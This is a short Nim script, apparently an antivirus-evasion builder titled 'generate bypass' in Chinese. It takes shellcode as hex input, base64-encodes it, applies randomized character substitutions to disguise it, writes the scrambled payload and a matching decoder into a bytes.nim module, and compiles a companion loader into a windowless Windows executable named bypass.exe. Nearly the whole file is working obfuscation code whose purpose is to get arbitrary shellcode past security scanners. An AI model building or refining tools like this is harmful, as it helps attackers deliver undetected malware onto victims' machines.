# nim c -d:release genbypass.nim
# 生成bypass

import base64
import strutils
import strformat
import random
import os

randomize()

let used_enc_chars = ":;<>?[]^-_{}$&#"
let base64_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

proc shuffleCount(s : string, l : int) : string =
  var r = s
  shuffle(r)
  r.substr(0, l)

let
  replace_count = rand(3 .. len(used_enc_chars))
  to_chars = shuffleCount(used_enc_chars, replace_count)
  from_chars = shuffleCount(base64_table, replace_count)

echo "Enter shell code hex:"
let org_code : string = readLine(stdin)

echo fmt"shellcode len {len(org_code)}"

var
  enc_code : string = org_code.encode()
  dec_code : string = ""

echo fmt"replace {replace_count} times."
for i in 1 .. replace_count:
  let fromc = from_chars[i]
  let toc = to_chars[i]
  echo fmt"replace {fromc} to {toc}"
  dec_code.add fmt""".replace("{toc}", "{fromc}")"""
  enc_code = replace(enc_code, fromc, toc)

let result = fmt"""
# generated by genbypass
# original shellcode:
# {org_code}

import base64
import strutils

proc codeDecode(s : string) : string =
  s{dec_code}.decode()

let codes = "{enc_code}"

"""

echo "save bytes.nim"
writeFile("bytes.nim", result)

echo "building bypass.exe:"
discard execShellCmd("nim c -d:mingw --cpu:amd64 -d:danger --app:gui bypass.nim")

echo "ok."
